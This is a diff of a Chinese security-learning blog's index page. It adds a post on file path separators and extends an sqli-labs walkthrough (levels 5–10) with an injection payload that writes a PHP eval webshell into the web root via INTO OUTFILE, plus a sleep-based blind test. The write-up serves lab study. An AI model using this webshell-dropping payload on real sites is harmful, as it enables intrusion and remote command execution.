@@ -64,6 +64,114 @@
     <h1 class="page-type-title"></h1>
     
     
+    <article id="post-一句话木马的使用和理解" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+      
+
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/10/25/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E7%90%86%E8%A7%A3/">一句话木马的使用和理解</a>
+</h2>
+
+
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2021/10/25/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E7%90%86%E8%A7%A3/" class="article-date">
+  <time datetime="2021-10-25T02:46:54.000Z" itemprop="datePublished">2021-10-25</time>
+</a>
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+        
+      
+      
+      
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/25/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E7%90%86%E8%A7%A3/" data-id="ckv629esq000hq4tcbngm4zsd" class="article-share-link">
+        Share
+      </a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+
+</article>
+    
+    <article id="post-“文件路径的小问题”" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+      
+
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/10/25/%E2%80%9C%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98%E2%80%9D/">“文件路径：\和/区别”</a>
+</h2>
+
+
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2021/10/25/%E2%80%9C%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98%E2%80%9D/" class="article-date">
+  <time datetime="2021-10-25T02:01:17.000Z" itemprop="datePublished">2021-10-25</time>
+</a>
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+        
+      
+      
+      <h2 id="文件路径：-和-区别"><a href="#文件路径：-和-区别" class="headerlink" title="文件路径：\和/区别"></a>文件路径：\和/区别</h2><p>Unix使用斜杆/ 作为路径分隔符，而web应用最新使用在Unix系统上面，所以目前所有的网络地址都采用 斜杆/ 作为分隔符。<br>Windows由于使用 斜杆/ 作为DOS命令提示符的参数标志了，为了不混淆，所以采用 反斜杠\ 作为路径分隔符。所以目前windows系统上的文件浏览器都是用 反斜杠\ 作为路径分隔符。随着发展，DOS系统已经被淘汰了，命令提示符也用的很少，斜杆和反斜杠在大多数情况下可以互换，没有影响。<br>知道这个背景后，可以总结一下结论：<br>（1）浏览器地址栏网址使用 斜杆/ ;<br>（2）windows文件浏览器上使用 反斜杠\ ;<br>（3）出现在html url() 属性中的路径，指定的路径是网络路径，所以必须用 斜杆/ ;<br>// 如果url后面用反斜杠，就不会显示任何背景<br>（4）出现在普通字符串中的路径，如果代表的是windows文件路径，则使用斜杆/和反斜杠\是一样的；如果代表的是网络文件路径，则必须使用 斜杆/ ;<br>// 本地文件路径，/ 和 \ 是等效的<br>// 网络文件路径，一定要使用 斜杆/<br>（5）windows系统的地址栏能够识别单反斜杠”&quot;，而不能识别双反斜杠”\“，这是系统文件系统自身的约定，路径层次使用“\”区分而不是使用“\”来区分：<br>所以F:\Office\Trunk__Out\Pro Debug\Bin\OfficeInfo.dll这样是不正确的。<br>而在程序中，字符串中的“\”主要是为了转义，“\”转义后被理解为“\”,“\”才能够被操作系统文件系统所理解，比如用字符串表示上述路径：“F:\Office\Trunk\__Out\Pro Debug\Bin\OfficeIn可以fo.dll”，同理，如果想要表示“\”，可以写作“\\”。</p>
+<p>在不同系统的情况系 windows下是,linux和unix下是/ 但在win中没有本质区别。<br>但是由于 \ 也是转义字符的起始字符，<br>所以，路径中的 \ 通常需要使用 \如果是 / 就不需要使用转义了<br>如C中文件操作，c:\kkk\dd.txt c:/kkk/dd.txt一样<br>“./“：代表目前所在的目录<br>“../“：代表上一层目录<br>\ 用于本地/ 用于网络连接地址</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/25/%E2%80%9C%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98%E2%80%9D/" data-id="ckv629esp000fq4tcg03u1e5q" class="article-share-link">
+        Share
+      </a>
+      
+<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/" rel="tag">文件路径</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+
+  
+
+</article>
+    
     <article id="post-“mysql的文件导出”" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
@@ -153,7 +261,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/24/%E2%80%9Cmysql%E7%9A%84%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E2%80%9D/" data-id="ckv5f73xk0009mctc1fzjd6ew" class="article-share-link">
+      <a data-url="http://example.com/2021/10/24/%E2%80%9Cmysql%E7%9A%84%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E2%80%9D/" data-id="ckv629esn000bq4tcbr7sdaqz" class="article-share-link">
         Share
       </a>
       
@@ -167,7 +275,7 @@
 
 </article>
     
-    <article id="post-“sqlilab5-9”" class="article article-type-post" itemscope
+    <article id="post-“sqlilab5-10”" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -176,7 +284,7 @@
       
 
 <h2 itemprop="name">
-  <a class="article-title" href="/2021/10/23/%E2%80%9Csqlilab5-9%E2%80%9D/">“sqlilab5-9”</a>
+  <a class="article-title" href="/2021/10/23/%E2%80%9Csqlilab5-10%E2%80%9D/">“sqlilab5-10”</a>
 </h2>
 
 
@@ -186,7 +294,7 @@
 
     
     <div class="article-meta">
-      <a href="/2021/10/23/%E2%80%9Csqlilab5-9%E2%80%9D/" class="article-date">
+      <a href="/2021/10/23/%E2%80%9Csqlilab5-10%E2%80%9D/" class="article-date">
   <time datetime="2021-10-23T12:53:51.000Z" itemprop="datePublished">2021-10-23</time>
 </a>
       
@@ -201,18 +309,29 @@
         
       
       
-      <h2 id="sqlilab5-9"><a href="#sqlilab5-9" class="headerlink" title="sqlilab5-9"></a>sqlilab5-9</h2><h3 id="sqlilab5"><a href="#sqlilab5" class="headerlink" title="sqlilab5"></a>sqlilab5</h3><p>通过尝试可以得出存在注入点，而且为单引号注入</p>
+      <h2 id="sqlilab5-10"><a href="#sqlilab5-10" class="headerlink" title="sqlilab5-10"></a>sqlilab5-10</h2><h3 id="sqlilab5"><a href="#sqlilab5" class="headerlink" title="sqlilab5"></a>sqlilab5</h3><p>通过尝试可以得出存在注入点，而且为单引号注入</p>
 <p>由于没有回显</p>
 <p>可以通过报错注入、时间盲注、布尔盲注</p>
 <h3 id="sqlilab6"><a href="#sqlilab6" class="headerlink" title="sqlilab6"></a>sqlilab6</h3><p>通过尝试可以得出为双引号注入</p>
 <p>其他与第五题一样</p>
 <h3 id="sqlilab7"><a href="#sqlilab7" class="headerlink" title="sqlilab7"></a>sqlilab7</h3><p>通过尝试得出为((‘id’))的形式，同时通过尝试无法使用报错注入，但是可以使用时间盲注和布尔盲注</p>
 <p>可是通过提示发现要求我们使用<code>outfile</code></p>
+<p>同时可以使用一句话木马，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; into outfile &quot;F:\\WhiteFlie\\PhpStudy20180211\\PHPTutorial\\WWW\\sqli-labs\\ttt.php&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>用中国菜刀连接</p>
+<h3 id="sqlilab8"><a href="#sqlilab8" class="headerlink" title="sqlilab8"></a>sqlilab8</h3><p>通过尝试得出为单引号注入，没有报错回显，所以无法使用报错注入，但是可以用时间盲注和布尔盲注，以及outfile</p>
+<h3 id="sqlilab9"><a href="#sqlilab9" class="headerlink" title="sqlilab9"></a>sqlilab9</h3><p>这一题比较恶心，不管是正确与错误，它的返回值都是一样的</p>
+<p>所以无法用直接看出注入点，</p>
+<p>但是可以用sleep来测试</p>
+<p>?id=1‘ and sleep(5) –+</p>
+<p>如果and前面正常就会延迟5秒显示，反之不会，其他与第八题一样</p>
+<h3 id="sqlilab10"><a href="#sqlilab10" class="headerlink" title="sqlilab10"></a>sqlilab10</h3><p>与第9题基本相同，只有一点不同，就是为双引号注入，其他一样</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/23/%E2%80%9Csqlilab5-9%E2%80%9D/" data-id="ckv5f73xo000dmctcderp9dkd" class="article-share-link">
+      <a data-url="http://example.com/2021/10/23/%E2%80%9Csqlilab5-10%E2%80%9D/" data-id="ckv629eso000dq4tch7xd746u" class="article-share-link">
         Share
       </a>
       
@@ -296,7 +415,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/20/sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" data-id="ckv5f73xh0005mctc5j2xbwiy" class="article-share-link">
+      <a data-url="http://example.com/2021/10/20/sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" data-id="ckv629esk0005q4tc153gbj0y" class="article-share-link">
         Share
       </a>
       
@@ -363,7 +482,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/20/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="ckv5f73xj0008mctc7sw1dgmc" class="article-share-link">
+      <a data-url="http://example.com/2021/10/20/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="ckv629esl0008q4tc6baohyvx" class="article-share-link">
         Share
       </a>
       
@@ -500,7 +619,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/16/sql-labs%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="ckv5f73x40001mctc9xf21u2b" class="article-share-link">
+      <a data-url="http://example.com/2021/10/16/sql-labs%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="ckv629esf0001q4tc7zaz9p4a" class="article-share-link">
         Share
       </a>
       
@@ -561,7 +680,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/12/sqlilab1-4/" data-id="ckv5f73xe0004mctc36a60c0a" class="article-share-link">
+      <a data-url="http://example.com/2021/10/12/sqlilab1-4/" data-id="ckv629esj0004q4tc46401r3g" class="article-share-link">
         Share
       </a>
       
@@ -850,7 +969,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/07/php%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" data-id="ckv5f73wz0000mctc2sj04g5n" class="article-share-link">
+      <a data-url="http://example.com/2021/10/07/php%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" data-id="ckv629es90000q4tc3i76cwu0" class="article-share-link">
         Share
       </a>
       
@@ -914,7 +1033,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/26/php%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/" data-id="ckv5f73xd0003mctc7s109qut" class="article-share-link">
+      <a data-url="http://example.com/2021/09/26/php%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/" data-id="ckv629esi0003q4tc17sydfi5" class="article-share-link">
         Share
       </a>
       
@@ -930,75 +1049,13 @@
 
 </article>
     
-    <article id="post-web安全-网络基础知识" class="article article-type-post" itemscope
-  itemprop="blogPost" data-scroll-reveal>
-
-  <div class="article-inner">
-    
-    <header class="article-header">
-      
-
-<h2 itemprop="name">
-  <a class="article-title" href="/2021/09/22/web%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">web安全-网络基础知识</a>
-</h2>
-
-
-
-    </header>
-    
-
-    
-    <div class="article-meta">
-      <a href="/2021/09/22/web%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-date">
-  <time datetime="2021-09-22T08:29:20.000Z" itemprop="datePublished">2021-09-22</time>
-</a>
-      
-    </div>
-    
-
-    
-
-    <div class="article-entry" itemprop="articleBody">
-      
-      
-        
-      
-      
-        <h1 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础"></a>网络基础</h1><p>为后续的web安全做基础</p>
-<h2 id="1-DNS相关知识"><a href="#1-DNS相关知识" class="headerlink" title="1.DNS相关知识"></a>1.DNS相关知识</h2><p> DNS：Domain Name System，域名解析系统<br>  1.建立IP地址与域名相关映射关系<br>  2.将域名解析为IP地址<br>  3.将IP地址解析为域名</p>
-<h3 id="DNS测试"><a href="#DNS测试" class="headerlink" title="DNS测试"></a>DNS测试</h3><h4 id="测试DNS的一个作用：解析域名"><a href="#测试DNS的一个作用：解析域名" class="headerlink" title="测试DNS的一个作用：解析域名"></a>测试DNS的一个作用：解析域名</h4><p>​       将DNS地址改为1.1.1.1<br>​       <img src="https://github.com/biegaoshi/biegaoshi.github.io/blob/main/img/tu1.png?raw=true" alt="tu1"><br>​       在cmd中ping一下百度的域名，如<br>​       <code>​      </code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>​       <code>​      </code><br>​        <img src="https://github.com/biegaoshi/biegaoshi.github.io/blob/main/img/tu2.png?raw=true" alt="tu2"><br>​        由此可以看出如果dns的地址出现错误，在访问域名时将无法访问</p>
-        
-          <p>
-            <a class="article-more-link" href="/2021/09/22/web%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-              Read More...
-            </a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/22/web%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" data-id="ckv5f73xm000bmctcbz6xhbz7" class="article-share-link">
-        Share
-      </a>
-      
-<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80-hexo-%E5%8D%9A%E5%AE%A2-%E7%A7%91%E6%9D%A5/" rel="tag">-网络基础 -hexo -博客 -科来</a></li></ul>
-
-    </footer>
-
-  </div>
-
-  
-
-  
-
-</article>
-    
   </article>
   
 
+  
+  <nav class="page-nav">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next</a>
+  </nav>
   
 </section>
 </div>
